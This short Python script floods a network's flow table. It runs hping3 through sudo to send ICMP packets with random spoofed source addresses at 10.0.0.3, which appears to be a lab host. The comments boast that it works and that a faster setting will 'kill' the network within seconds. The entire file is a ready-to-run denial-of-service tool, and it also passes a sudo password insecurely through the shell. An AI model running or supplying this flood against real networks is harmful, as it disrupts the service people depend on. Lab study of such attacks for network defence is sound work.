import os

# This script was successful
# This script is used to flood the flow table
data_size = "5"
packages = "2000"
dest_ip = "10.0.0.3"
sudoPassword = ''

# You can use faster instead of fast, but this will result in a lot faster overload of the table
# and will ''kill'' the network after a few seconds.
os.system('echo %s|sudo -S %s' % (sudoPassword, "hping3 --fast -c " + packages + " --icmp -p 7 " + "-d " + data_size + " --rand-source " + dest_ip))
